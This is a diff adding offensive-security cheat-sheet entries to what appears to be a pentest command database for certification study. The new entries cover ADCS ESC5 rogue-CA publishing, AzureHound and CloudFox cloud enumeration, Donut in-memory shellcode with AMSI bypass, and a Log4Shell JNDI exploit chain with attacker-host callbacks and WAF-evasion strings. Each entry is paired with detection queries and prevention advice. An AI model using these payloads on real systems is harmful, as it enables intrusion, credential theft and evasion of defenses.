@@ -5436,6 +5436,116 @@ const COMMAND_DATA = {
       }
     },
     {
+      "id": "ad-adcs-esc5-ca-object-acl",
+      "name": "ADCS ESC5 - Vulnerable PKI Object Access Control",
+      "command": "certipy find -u <user>@<domain> -p <password> -dc-ip <dc_ip> -vulnerable",
+      "description": "ESC5 abuses weak ACLs on PKI objects outside the CA itself - the CA computer object, the CA server, or AD container objects under CN=Public Key Services (certificate templates container, NTAuthCertificates, Enrollment Services). Control over any of these lets an attacker add rogue templates, publish a malicious CA cert to NTAuth, or compromise the CA host, leading to domain-wide authentication forgery.",
+      "platform": "windows",
+      "type": "attack-chain",
+      "opsec": "moderate",
+      "category": "Active Directory",
+      "subcategory": "ADCS",
+      "certifications": [
+        "CRTP",
+        "CPTS"
+      ],
+      "primary_cert": "CRTP",
+      "source": "SpecterOps \"Certified Pre-Owned\" (ESC5)",
+      "tags": [
+        "adcs",
+        "esc5",
+        "pki",
+        "acl",
+        "ntauth",
+        "certificate",
+        "privilege-escalation"
+      ],
+      "mitre": [
+        "T1649",
+        "T1098"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== FIND VULNERABLE PKI OBJECTS ===\n  certipy find -u <user>@<domain> -p <password> -dc-ip <dc_ip> -vulnerable -stdout\n  # ESC5 is contextual: review ACLs on CA computer object + PKI containers\n\n=== KEY OBJECTS (CN=Public Key Services,CN=Services,CN=Configuration) ===\n  - Certificate Templates container  (add/modify templates -> ESC1-style)\n  - Enrollment Services              (register a rogue Enrollment Service)\n  - NTAuthCertificates               (publish a rogue CA cert -> forge any logon)\n  - The CA computer object / CA host  (SYSTEM on CA = full control)\n\n=== CHECK ACLs ON PKI CONTAINERS (PowerView) ===\n  Get-DomainObjectAcl -SearchBase \"CN=Public Key Services,CN=Services,CN=Configuration,DC=<dc>,DC=<tld>\" -ResolveGUIDs |\n    ? { $_.ActiveDirectoryRights -match \"WriteDacl|WriteOwner|GenericAll|GenericWrite\" }\n\n=== EXPLOIT PATHS ===\n  # If you control the CA computer object -> RBCD/takeover -> SYSTEM on CA\n  #   then dump CA key and forge certs (see certsync / ESC1)\n  # If you can write NTAuthCertificates -> publish attacker CA, forge any user cert\n  # If you can add templates -> create an ESC1 (ENROLLEE_SUPPLIES_SUBJECT + client auth)\n\n=== PUBLISH A ROGUE CA TO NTAUTH (illustrative) ===\n  certutil -dspublish -f rogue_ca.crt NTAuthCA\n\n=== ALTERNATIVES / RELATED ===\n  ESC4  # write access to a template object (subset)\n  ESC7  # CA role (ManageCA/ManageCertificates) abuse\n  ESC6  # EDITF_ATTRIBUTESUBJECTALTNAME2 on CA",
+      "examples": [
+        {
+          "label": "Find vulnerable PKI objects",
+          "command": "certipy find -u jdoe@corp.local -p Passw0rd! -dc-ip 10.10.10.5 -vulnerable -stdout"
+        },
+        {
+          "label": "Audit PKI container ACLs",
+          "command": "Get-DomainObjectAcl -SearchBase \"CN=Public Key Services,CN=Services,CN=Configuration,DC=corp,DC=local\" -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match \"WriteDacl|GenericAll\" }"
+        },
+        {
+          "label": "Publish rogue CA to NTAuth",
+          "command": "certutil -dspublish -f rogue_ca.crt NTAuthCA"
+        }
+      ],
+      "references": [
+        {
+          "title": "Certified Pre-Owned (ESC5)",
+          "url": "https://posts.specterops.io/certified-pre-owned-d95910965cd2"
+        },
+        {
+          "title": "MITRE T1649 - Steal or Forge Authentication Certificates",
+          "url": "https://attack.mitre.org/techniques/T1649/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ad-adcs-esc7-ca-officer",
+          "note": "ESC7 abuses CA role permissions (related ADCS escalation).",
+          "rel": "alternative"
+        },
+        {
+          "id": "ad-adcs-esc6-editf-flag",
+          "note": "ESC6 abuses the CA SAN flag.",
+          "rel": "alternative"
+        },
+        {
+          "id": "ad-certipy-toolkit",
+          "note": "Certipy enumerates and exploits ADCS ESC paths.",
+          "rel": "prereq"
+        },
+        {
+          "id": "ad-adcs-esc4-template-acl",
+          "note": "ESC4 abuses writable template ACLs (related PKI ACL weakness).",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "The security of ADCS depends on ACLs across many objects, not just templates. Misconfigured permissions on the CA host, CA computer object, or PKI containers (especially NTAuthCertificates) let an attacker introduce trust that forges authentication for any principal.",
+        "prerequisites": "Write/control rights (WriteDacl/WriteOwner/GenericAll) over a CA object, the CA host, or a PKI container.",
+        "impact": "Domain-wide authentication forgery - effectively domain compromise - via rogue templates or a trusted rogue CA.",
+        "detection": "[MITRE T1649/T1098] Changes to NTAuthCertificates or objects under CN=Public Key Services (5136 directory-object modifications); new certificate templates; certutil -dspublish; takeover activity on the CA host.",
+        "artifacts": "5136 modifications to PKI container objects; new/edited templates; unexpected entries in NTAuth store; CA host compromise indicators.",
+        "splunk_spl": "index=windows EventCode=5136 ObjectDN=\"*Public Key Services*\"\n| table _time, SubjectUserName, ObjectDN, AttributeLDAPDisplayName, OperationType",
+        "elastic_kql": "event.code:5136 and winlog.event_data.ObjectDN:*Public\\ Key\\ Services*",
+        "sentinel_kql": "SecurityEvent\n| where EventID == 5136 and ObjectDN has \"Public Key Services\"\n| project TimeGenerated, SubjectUserName, ObjectDN, AttributeLDAPDisplayName, OperationType",
+        "sigma_rules": "win_adcs_pki_object_modification",
+        "prevention": "Lock down ACLs on the CA host, CA computer object, and all CN=Public Key Services containers (especially NTAuthCertificates); treat ADCS as Tier-0; audit 5136 on PKI objects; enable strong certificate mapping (KB5014754).",
+        "sources": [
+          "SpecterOps Certified Pre-Owned",
+          "https://attack.mitre.org/techniques/T1649/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Modification of PKI/NTAuth objects (ADCS ESC5)",
+            "logic": "SecurityEvent\n| where EventID == 5136 and ObjectDN has \"Public Key Services\"\n| where AttributeLDAPDisplayName in (\"cACertificate\",\"certificateTemplates\",\"nTSecurityDescriptor\",\"flags\")\n| project TimeGenerated, SubjectUserName, ObjectDN, AttributeLDAPDisplayName, OperationType",
+            "data_source": "windows-security",
+            "attack": [
+              "T1649",
+              "T1098"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "high",
+            "false_positives": "Legitimate PKI administration/CA maintenance",
+            "tuning": "Alert on changes by non-PKI-admin principals; baseline normal CA admin accounts"
+          }
+        ]
+      }
+    },
+    {
       "id": "ad-adcs-esc6-editf-flag",
       "name": "ADCS ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 Flag Abuse",
       "command": "certipy req -u <user>@<domain> -p <password> -ca <ca_name> -template User -upn administrator@<domain>",
@@ -14646,6 +14756,111 @@ const COMMAND_DATA = {
       "explain": "Enumerates the Azure Resource Manager layer with the az CLI:\n  az resource list -o table   list every resource your principal can see\nThe card walks accounts/subscriptions (az account list), resource groups (az group list), and - most importantly - RBAC via 'az role assignment list --all' and role definitions to find what you can do and where to escalate."
     },
     {
+      "id": "cloud-azurehound",
+      "name": "AzureHound - BloodHound Collection for Azure/Entra ID",
+      "command": "azurehound -u <user> -p <password> list --tenant <domain> -o output.json",
+      "description": "AzureHound collects Azure AD / Entra ID and Azure Resource Manager relationships (users, groups, roles, service principals, app registrations, subscriptions, VMs) into BloodHound-ingestible JSON. It reveals attack paths in the cloud: who can reset whose password, who owns which app, which identity can escalate to Global Admin or across subscriptions.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Cloud Security",
+      "subcategory": "Azure Enumeration",
+      "certifications": [
+        "MCRTA",
+        "CRTP"
+      ],
+      "primary_cert": "MCRTA",
+      "source": "SpecterOps/AzureHound",
+      "tags": [
+        "azurehound",
+        "bloodhound",
+        "azure",
+        "entra",
+        "azure-ad",
+        "enumeration",
+        "attack-paths"
+      ],
+      "mitre": [
+        "T1087.004",
+        "T1069.003"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== AUTH + COLLECT (username/password) ===\n  azurehound -u <user> -p <password> list --tenant <domain> -o output.json\n\n=== WITH A REFRESH TOKEN / JWT ===\n  azurehound -r \"<refresh_token>\" list --tenant <domain> -o output.json\n  azurehound -j \"<jwt>\" list --tenant <domain> -o output.json\n\n=== SERVICE PRINCIPAL AUTH ===\n  azurehound -a <app_id> -s \"<client_secret>\" --tenant <domain> list -o output.json\n\n=== COLLECT SPECIFIC DATA ===\n  azurehound list users --tenant <domain>\n  azurehound list groups --tenant <domain>\n  azurehound list roles --tenant <domain>\n  azurehound list service-principals --tenant <domain>\n\n=== INGEST ===\n  # Upload output.json into BloodHound CE (Azure data model)\n  # Key queries: paths to Global Admin, app owners, SP creds abuse\n\n=== GETTING A TOKEN (az cli) ===\n  az login\n  az account get-access-token --resource-type ms-graph\n\n=== ALTERNATIVES ===\n  ROADrecon       # offline Azure AD dump + GUI\n  Stormspotter    # ARM + AAD graph\n  BloodHound CE   # consumes AzureHound output",
+      "examples": [
+        {
+          "label": "Collect with creds",
+          "command": "azurehound -u user@corp.com -p \"Passw0rd!\" list --tenant corp.onmicrosoft.com -o output.json"
+        },
+        {
+          "label": "Collect with refresh token",
+          "command": "azurehound -r \"0.ARoA...\" list --tenant corp.onmicrosoft.com -o output.json"
+        },
+        {
+          "label": "Users only",
+          "command": "azurehound list users --tenant corp.onmicrosoft.com"
+        }
+      ],
+      "references": [
+        {
+          "title": "AzureHound",
+          "url": "https://github.com/SpecterOps/AzureHound"
+        },
+        {
+          "title": "MITRE T1087.004 - Cloud Account Discovery",
+          "url": "https://attack.mitre.org/techniques/T1087/004/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "cloud-roadrecon",
+          "note": "ROADrecon is the offline Azure AD dump alternative.",
+          "rel": "alternative"
+        },
+        {
+          "id": "ad-bloodhound-ce",
+          "note": "Ingest AzureHound output into BloodHound.",
+          "rel": "next"
+        },
+        {
+          "id": "azure-entra-enum",
+          "note": "Targeted Entra enumeration without the full graph.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "AzureHound uses legitimate Microsoft Graph and ARM read APIs available to any authenticated principal. Directory read access is broad by default, so one identity can map most tenant relationships.",
+        "prerequisites": "Any valid Entra identity (user, refresh token, or service principal); Graph/ARM read access.",
+        "impact": "Complete cloud attack-path map: privilege escalation to Global Admin, cross-subscription paths, app/SP abuse.",
+        "detection": "[MITRE T1087.004/T1069.003] Bulk Microsoft Graph enumeration (directoryObjects, servicePrincipals, roleAssignments) from one principal; AzureHound User-Agent; sign-in followed by high-volume Graph reads.",
+        "artifacts": "Entra sign-in + AuditLogs/MicrosoftGraphActivityLogs showing enumeration bursts; non-interactive token use.",
+        "splunk_spl": "index=azure sourcetype=azure:graph\n| stats dc(request_uri) as endpoints count by user\n| where count > 500",
+        "elastic_kql": "azure.graphactivitylogs.properties.user_agent:*azurehound*",
+        "sentinel_kql": "MicrosoftGraphActivityLogs\n| summarize Requests=count(), Endpoints=dcount(RequestUri) by UserId, bin(TimeGenerated, 10m)\n| where Requests > 500",
+        "sigma_rules": "azure_bulk_graph_enumeration",
+        "prevention": "Least-privilege directory roles; restrict directory read via admin consent policies; Conditional Access + MFA; monitor Graph activity logs for bulk enumeration; limit guest visibility.",
+        "sources": [
+          "SpecterOps",
+          "https://attack.mitre.org/techniques/T1087/004/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Bulk Entra/Graph enumeration (AzureHound)",
+            "logic": "MicrosoftGraphActivityLogs\n| where RequestUri has_any (\"/servicePrincipals\",\"/directoryRoles\",\"/roleManagement\",\"/groups\")\n| summarize Endpoints=dcount(RequestUri), Requests=count() by UserId, bin(TimeGenerated, 10m)\n| where Requests > 300",
+            "data_source": "defender-endpoint",
+            "attack": [
+              "T1087.004",
+              "T1069.003"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "CSPM/IGA tools that enumerate the directory",
+            "tuning": "Allowlist known governance service principals"
+          }
+        ]
+      }
+    },
+    {
       "type": "command",
       "platform": "windows",
       "requires": [
@@ -22014,6 +22229,110 @@ const COMMAND_DATA = {
         }
       },
       "explain": "Finds a company's exposed cloud storage with search-engine dorks:\n  intext:<company> inurl:amazonaws.com   Google dork for S3 URLs referencing the target\nMisconfigured buckets/blobs leak keys, backups, and source; the card pairs it with inurl:blob.core.windows.net for Azure and a host loop to resolve discovered subdomains to cloud IPs."
+    },
+    {
+      "id": "cloud-cloudfox",
+      "name": "CloudFox - AWS Post-Exploitation Enumeration",
+      "command": "cloudfox aws --profile <profile> all-checks",
+      "description": "CloudFox helps attackers find exploitable attack paths in AWS using existing credentials. It answers offensive questions: what roles can I assume, which secrets/env vars hold credentials, what public endpoints and instances exist, where can I move laterally, and what permissions do I have. Read-only enumeration that surfaces privilege-escalation and lateral-movement opportunities.",
+      "platform": "linux",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Cloud Security",
+      "subcategory": "AWS Enumeration",
+      "certifications": [
+        "MCRTA",
+        "CPTS"
+      ],
+      "primary_cert": "MCRTA",
+      "source": "BishopFox/cloudfox",
+      "tags": [
+        "cloudfox",
+        "aws",
+        "enumeration",
+        "post-exploitation",
+        "attack-paths",
+        "privilege-escalation"
+      ],
+      "mitre": [
+        "T1526",
+        "T1580"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== PREREQ: configured AWS creds ===\n  aws configure --profile <profile>     # or env vars / assumed role\n  aws sts get-caller-identity --profile <profile>   # confirm identity\n\n=== RUN EVERYTHING ===\n  cloudfox aws --profile <profile> all-checks\n  # Across all enabled regions by default; outputs CSV/loot to ./cloudfox-output/\n\n=== TARGETED CHECKS ===\n  cloudfox aws --profile <profile> inventory        # what exists, where\n  cloudfox aws --profile <profile> endpoints        # reachable URLs/APIs\n  cloudfox aws --profile <profile> instances        # EC2 + IPs\n  cloudfox aws --profile <profile> secrets          # Secrets Manager/SSM\n  cloudfox aws --profile <profile> env-vars         # creds in task/lambda env\n  cloudfox aws --profile <profile> iam-simulator    # what can my principal do\n  cloudfox aws --profile <profile> permissions      # enumerate IAM perms\n  cloudfox aws --profile <profile> principals        # users/roles\n\n=== LOOT FILES (ready-to-run commands) ===\n  # cloudfox writes loot/ with pre-built aws cli + pmapper/pacu follow-ups\n\n=== ALTERNATIVES ===\n  Pacu              # full exploitation framework\n  enumerate-iam     # quick permission brute\n  ScoutSuite/Prowler # audit (defensive framing)\n  pmapper           # IAM privesc graphing",
+      "examples": [
+        {
+          "label": "Run all checks",
+          "command": "cloudfox aws --profile target all-checks"
+        },
+        {
+          "label": "Hunt secrets + env creds",
+          "command": "cloudfox aws --profile target secrets env-vars"
+        },
+        {
+          "label": "What can my principal do",
+          "command": "cloudfox aws --profile target iam-simulator"
+        }
+      ],
+      "references": [
+        {
+          "title": "CloudFox",
+          "url": "https://github.com/BishopFox/cloudfox"
+        },
+        {
+          "title": "MITRE T1526 - Cloud Service Discovery",
+          "url": "https://attack.mitre.org/techniques/T1526/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "aws-pacu-enum",
+          "note": "Pacu for active exploitation after CloudFox mapping.",
+          "rel": "next"
+        },
+        {
+          "id": "cloud-enumerate-iam",
+          "note": "enumerate-iam for quick permission brute-forcing.",
+          "rel": "alternative"
+        },
+        {
+          "id": "cloud-prowler-audit",
+          "note": "Prowler/ScoutSuite give the defensive audit view.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "CloudFox calls read-only AWS APIs (Describe*, List*, Get*) permitted by the compromised principal. These calls are normal control-plane activity, so enumeration blends in unless volume/patterns are baselined.",
+        "prerequisites": "Valid AWS credentials (keys, assumed role, or instance profile).",
+        "impact": "Rapid discovery of privilege-escalation paths, exposed secrets, reachable endpoints, and lateral-movement options.",
+        "detection": "[MITRE T1526/T1580] CloudTrail burst of Describe*/List*/Get* across many services and regions from one identity in a short window; cloudfox user-agent; SimulatePrincipalPolicy calls.",
+        "artifacts": "CloudTrail enumeration spikes; GetSecretValue/GetParameter reads; aws-sdk-go user agent patterns.",
+        "splunk_spl": "index=aws sourcetype=aws:cloudtrail (eventName=Describe* OR eventName=List* OR eventName=Get*)\n| stats dc(eventSource) as services count by userIdentity.arn\n| where services > 10 AND count > 200",
+        "elastic_kql": "aws.cloudtrail.user_agent:*cloudfox* or event.action:(Describe* or List*)",
+        "sentinel_kql": "AWSCloudTrail\n| where EventName startswith \"Describe\" or EventName startswith \"List\" or EventName startswith \"Get\"\n| summarize Services=dcount(EventSource), Calls=count() by UserIdentityArn, bin(TimeGenerated, 10m)\n| where Services > 10 and Calls > 200",
+        "sigma_rules": "aws_mass_enumeration_cloudfox",
+        "prevention": "Least-privilege IAM; do not store secrets in env vars/user-data (use short-lived creds); GuardDuty (Recon finding types); alert on cross-service enumeration bursts; scope roles tightly.",
+        "sources": [
+          "BishopFox",
+          "https://attack.mitre.org/techniques/T1526/"
+        ],
+        "detections": [
+          {
+            "platform": "splunk",
+            "name": "AWS cross-service enumeration burst (CloudFox/Pacu)",
+            "logic": "index=aws sourcetype=aws:cloudtrail (eventName=Describe* OR eventName=List* OR eventName=Get* OR eventName=SimulatePrincipalPolicy)\n| bin _time span=10m\n| stats dc(eventSource) as services count by _time, userIdentity.arn\n| where services > 10 AND count > 200",
+            "data_source": "cloud-trail",
+            "attack": [
+              "T1526",
+              "T1580"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "CSPM tools, inventory automation, backup scanners",
+            "tuning": "Baseline per-identity service breadth; allowlist known automation roles"
+          }
+        ]
+      }
     },
     {
       "id": "cdsa-m10-code-analysis-ida",
@@ -39844,6 +40163,111 @@ const COMMAND_DATA = {
             "confidence": "high",
             "false_positives": "Backup/EDR agents enumerating user profiles",
             "tuning": "Exclude known management service accounts; threshold on distinct hosts touched"
+          }
+        ]
+      }
+    },
+    {
+      "id": "donut-shellcode",
+      "name": "Donut - In-Memory .NET/EXE/DLL to Shellcode",
+      "command": "donut -i <file> -o payload.bin",
+      "description": "Donut converts .NET assemblies, EXEs, DLLs, VBS/JS, and XSLT into position-independent shellcode that loads and runs the payload entirely in memory (no disk write). Combined with a shellcode runner/process injection, it lets you execute tools like Rubeus, SharpHound, or Mimikatz fileless, defeating on-disk AV and complicating EDR.",
+      "platform": "windows",
+      "type": "command",
+      "opsec": "quiet",
+      "category": "Post-Exploitation",
+      "subcategory": "AV Evasion",
+      "certifications": [
+        "CRTP",
+        "CPTS"
+      ],
+      "primary_cert": "CRTP",
+      "source": "TheWover/donut",
+      "tags": [
+        "donut",
+        "shellcode",
+        "in-memory",
+        "dotnet",
+        "av-evasion",
+        "fileless",
+        "injection"
+      ],
+      "mitre": [
+        "T1027",
+        "T1620"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== CONVERT A .NET ASSEMBLY TO SHELLCODE ===\n  donut -i Rubeus.exe -o rubeus.bin\n  # With arguments passed to the assembly:\n  donut -i Rubeus.exe -p \"kerberoast /outfile:hashes.txt\" -o rubeus.bin\n\n=== ENTRYPOINT / CLASS / METHOD (for DLLs) ===\n  donut -i Lib.dll -c Namespace.Class -m Method -o out.bin\n\n=== ARCH + BYPASS OPTIONS ===\n  donut -i tool.exe -a 2 -o out.bin         # -a 2 = x64 (1=x86, 3=both)\n  donut -i tool.exe -b 3 -o out.bin         # -b 3 = bypass AMSI+WLDP\n  donut -i tool.exe -e 3 -o out.bin         # -e = entropy/encryption level\n  donut -i tool.exe -f 1 -o out.bin         # -f format (1=binary,2=base64,...)\n\n=== RUN THE SHELLCODE (needs a loader) ===\n  # Inject into a process with a runner:\n  #   process-injection-runner / C2 shinject / custom C# or Nim loader\n  # The payload executes in memory - nothing hits disk\n\n=== PYTHON API ===\n  # donut.py exposes create() for scripting payload generation\n\n=== ALTERNATIVES ===\n  sRDI            # DLL -> shellcode\n  Shellter        # inject into legit PE\n  msfvenom        # classic shellcode (more signatured)\n  C2 built-ins    # Cobalt/Havoc execute-assembly",
+      "examples": [
+        {
+          "label": "Rubeus to shellcode with args",
+          "command": "donut -i Rubeus.exe -p \"kerberoast /outfile:h.txt\" -o rubeus.bin"
+        },
+        {
+          "label": "x64 with AMSI/WLDP bypass",
+          "command": "donut -i SharpHound.exe -a 2 -b 3 -o sh.bin"
+        },
+        {
+          "label": "DLL with entrypoint",
+          "command": "donut -i Lib.dll -c Corp.Loader -m Run -o out.bin"
+        }
+      ],
+      "references": [
+        {
+          "title": "donut",
+          "url": "https://github.com/TheWover/donut"
+        },
+        {
+          "title": "MITRE T1620 - Reflective Code Loading",
+          "url": "https://attack.mitre.org/techniques/T1620/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "process-injection-runner",
+          "note": "Inject the generated shellcode into a process.",
+          "rel": "next"
+        },
+        {
+          "id": "powershell-shellcode-runner",
+          "note": "Run the shellcode via a PowerShell loader.",
+          "rel": "next"
+        },
+        {
+          "id": "amsi-bypass",
+          "note": "Pair with AMSI bypass for in-memory .NET execution.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Donut produces encrypted, position-independent shellcode that reflectively loads a payload in memory, so nothing is written to disk and static/on-disk AV has no file to scan. Built-in AMSI/WLDP bypass hampers in-memory .NET scanning.",
+        "prerequisites": "Code execution on the host; a shellcode loader/injector to run the output.",
+        "impact": "Fileless execution of offensive .NET/PE tools, evading signature-based and on-disk detection.",
+        "detection": "[MITRE T1027/T1620] Behavioral: RWX memory allocation + remote thread creation; CLR loaded into a non-.NET process; AMSI tampering; unbacked executable memory; ETW/EDR reflective-load telemetry.",
+        "artifacts": "Injected RWX regions; CLR DLLs in unexpected processes; AMSI patch indicators; no payload file on disk.",
+        "splunk_spl": "index=windows EventCode=8 SourceImage=* TargetImage=*\n| search GrantedAccess=0x1fffff\n| table _time, SourceImage, TargetImage, Computer",
+        "elastic_kql": "winlog.event_id:8 and winlog.event_data.GrantedAccess:(\"0x1fffff\" or \"0x1f0fff\")",
+        "sentinel_kql": "DeviceEvents\n| where ActionType in (\"CreateRemoteThreadApiCall\",\"WriteToLsassProcessMemory\",\"AmsiScanBufferTampering\")\n| project Timestamp, DeviceName, InitiatingProcessFileName, ActionType",
+        "sigma_rules": "win_reflective_code_loading_donut",
+        "prevention": "EDR with in-memory/behavioral detection; enable AMSI and alert on tampering; attack-surface-reduction rules; block unsigned/unexpected process injection; application control (WDAC); monitor RWX + remote threads.",
+        "sources": [
+          "TheWover/donut",
+          "https://attack.mitre.org/techniques/T1620/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "In-memory reflective loading / injection (donut-style)",
+            "logic": "DeviceEvents\n| where ActionType in (\"CreateRemoteThreadApiCall\",\"AmsiScanBufferTampering\")\n| summarize count() by DeviceName, InitiatingProcessFileName, ActionType, bin(Timestamp, 5m)",
+            "data_source": "defender-endpoint",
+            "attack": [
+              "T1027",
+              "T1620"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Some legitimate .NET JIT/profiling and injection-based security tools",
+            "tuning": "Correlate RWX allocation + remote thread + CLR load in a non-.NET parent"
           }
         ]
       }
@@ -83885,6 +84309,109 @@ const COMMAND_DATA = {
         }
       },
       "explain": "Poisons broadcast name resolution to capture NetNTLMv2 hashes - no credentials required:\n  sudo responder           answer LLMNR/NBT-NS/MDNS name-resolution broadcasts as if you own the requested name\n  -I <interface>           the network interface to listen and respond on\n  -d                       also answer NetBIOS domain suffix queries\n  -w                       start the built-in WPAD rogue proxy\n  -v                       verbose (show captured hashes)\nWhen a host mistypes a name, it authenticates to you; crack the captured NetNTLMv2 offline (hashcat -m 5600) or relay it."
+    },
+    {
+      "id": "web-log4shell",
+      "name": "Log4Shell - Log4j JNDI Injection RCE (CVE-2021-44228)",
+      "command": "${jndi:ldap://<lhost>:1389/a}",
+      "description": "Log4Shell is an unauthenticated RCE in Apache Log4j 2 (<2.15.0). Any attacker-controlled string that gets logged can embed a JNDI lookup (${jndi:ldap://...}) causing the server to fetch and execute a remote Java class. Delivered via any logged input: User-Agent, headers, form fields, usernames. One of the most impactful web vulns ever; still found on legacy Java stacks.",
+      "platform": "linux",
+      "type": "payload",
+      "opsec": "loud",
+      "category": "Web Exploitation",
+      "subcategory": "Injection",
+      "certifications": [
+        "CWES",
+        "CPTS"
+      ],
+      "primary_cert": "CWES",
+      "source": "CVE-2021-44228; LunaSec/Apache advisories",
+      "tags": [
+        "log4shell",
+        "log4j",
+        "jndi",
+        "cve-2021-44228",
+        "rce",
+        "java",
+        "deserialization"
+      ],
+      "mitre": [
+        "T1190"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== 1. START A JNDI EXPLOIT SERVER ===\n  # JNDIExploit / rogue-jndi serves the malicious class + LDAP referral\n  java -jar JNDIExploit-1.2-SNAPSHOT.jar -i <lhost> -p 8888\n  # or marshalsec LDAP referral + python http server hosting Exploit.class\n  java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer \"http://<lhost>:8000/#Exploit\" 1389\n\n=== 2. START A LISTENER ===\n  nc -lvnp <lport>\n\n=== 3. INJECT THE PAYLOAD (any logged field) ===\n  ${jndi:ldap://<lhost>:1389/a}\n  ${jndi:rmi://<lhost>:1099/a}\n  ${jndi:dns://<lhost>/a}            # blind detection via DNS callback\n\n  # In an HTTP header (very common injection point):\n  curl http://<target>/ -H 'User-Agent: ${jndi:ldap://<lhost>:1389/a}'\n  curl http://<target>/ -H 'X-Api-Version: ${jndi:ldap://<lhost>:1389/a}'\n\n=== WAF-BYPASS OBFUSCATIONS ===\n  ${\\${::-j}ndi:ldap://<lhost>/a}\n  ${jndi:\\${lower:l}\\${lower:d}a\\${lower:p}://<lhost>/a}\n  ${\\${env:BARFOO:-j}ndi\\${env:BARFOO:-:}...}\n\n=== BLIND DETECTION FIRST (no shell needed) ===\n  # Use an interactsh/Burp Collaborator / DNS-log domain:\n  ${jndi:ldap://x.<dns_log_domain>/a}\n  # A DNS/LDAP hit confirms the input reaches a vulnerable logger\n\n=== NUCLEI SCAN ===\n  nuclei -t http/cves/2021/CVE-2021-44228.yaml -u http://<target>/\n\n=== AFFECTED / FIXED ===\n  # Vulnerable: Log4j 2.0-beta9 .. 2.14.1\n  # Fixed: 2.15.0 (partial), 2.16.0 (JNDI off), 2.17.x (CVE-2021-45046/45105)",
+      "examples": [
+        {
+          "label": "Inject via User-Agent header",
+          "command": "curl http://target/ -H 'User-Agent: ${jndi:ldap://10.10.14.5:1389/a}'"
+        },
+        {
+          "label": "Blind DNS detection",
+          "command": "curl http://target/ -H 'X-Api: ${jndi:dns://x.collab.example/a}'"
+        },
+        {
+          "label": "Nuclei check",
+          "command": "nuclei -t http/cves/2021/CVE-2021-44228.yaml -u http://target/"
+        }
+      ],
+      "references": [
+        {
+          "title": "CVE-2021-44228",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-44228"
+        },
+        {
+          "title": "LunaSec Log4Shell writeup",
+          "url": "https://www.lunasec.io/docs/blog/log4j-zero-day/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "web-ssti",
+          "note": "Another server-side injection path to RCE.",
+          "rel": "alternative"
+        },
+        {
+          "id": "nuclei-vuln-scan",
+          "note": "Nuclei has templates to detect Log4Shell at scale.",
+          "rel": "prereq"
+        },
+        {
+          "id": "ssrf-exploit",
+          "note": "JNDI callbacks share SSRF-style blind detection patterns.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Vulnerable Log4j versions perform JNDI lookups on logged message content. An attacker string reaching any log statement triggers an outbound LDAP/RMI fetch of a remote Java class, which is then deserialized and executed.",
+        "prerequisites": "Application using Log4j 2.0-2.14.1 that logs attacker-controllable input; outbound network from the server (for the class fetch) - though local gadget chains can work without egress.",
+        "impact": "Unauthenticated remote code execution as the application user; full server compromise.",
+        "detection": "[MITRE T1190] Requests/logs containing ${jndi:...} (and obfuscated ${lower:}/${env:} variants); outbound LDAP (389/1389)/RMI (1099)/DNS from a web/app server to an external host; unexpected child processes from the Java process.",
+        "artifacts": "jndi strings in web/app logs; egress to attacker LDAP/RMI; Java spawning /bin/sh or cmd.exe.",
+        "splunk_spl": "index=web OR index=app (\"${jndi:\" OR \"$%7bjndi\" OR \"${lower:j}\")\n| table _time, src_ip, uri_path, http_user_agent",
+        "elastic_kql": "message:*jndi\\:* or http.request.headers.user-agent:*jndi*",
+        "sentinel_kql": "union _Im_WebSession, Syslog\n| where tostring(todynamic(AdditionalFields)) has \"jndi:\" or SyslogMessage has \"jndi:\"\n| project TimeGenerated, SrcIpAddr, Url, SyslogMessage",
+        "sigma_rules": "web_log4j_jndi_exploitation",
+        "prevention": "Upgrade Log4j to 2.17.1+; set log4j2.formatMsgNoLookups=true and remove JndiLookup class as interim; block outbound LDAP/RMI from servers; WAF rules for jndi patterns; inventory Java apps.",
+        "sources": [
+          "NVD CVE-2021-44228",
+          "https://attack.mitre.org/techniques/T1190/"
+        ],
+        "detections": [
+          {
+            "platform": "elastic",
+            "name": "Log4Shell JNDI exploitation attempt",
+            "logic": "message:(*jndi\\:ldap* or *jndi\\:rmi* or *jndi\\:dns* or *$%7bjndi*) or http.request.headers.user-agent:*jndi*",
+            "data_source": "iis",
+            "attack": [
+              "T1190"
+            ],
+            "fidelity": "signature",
+            "confidence": "high",
+            "false_positives": "Security scanners probing for Log4Shell",
+            "tuning": "Pair with egress LDAP/RMI detection to separate attempts from successful exploitation"
+          }
+        ]
+      }
     },
     {
       "id": "cdsa-logman-etw",
@@ -135139,6 +135666,94 @@ const COMMAND_DATA = {
       "explain": "Remote File Inclusion: make the vulnerable parameter fetch and execute a web shell hosted on your machine.:\n  <ip>     target IP address\n  <lhost>  your listener/attacker IP\n  <lport>  your listener port\nVerify RFI first with a local URL: ?language=http://127.0.0.1:80/index.php."
     },
     {
